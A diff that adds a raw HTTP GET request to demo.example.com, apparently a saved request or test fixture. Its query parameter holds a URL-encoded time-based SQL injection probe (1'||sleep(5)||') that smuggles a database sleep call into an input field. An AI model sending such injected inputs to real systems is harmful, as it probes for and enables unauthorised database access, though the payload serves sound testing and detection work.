@@ -1,0 +1,4 @@
+GET /a?s=1%27%7C%7Csleep%285%29%7C%7C%27 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
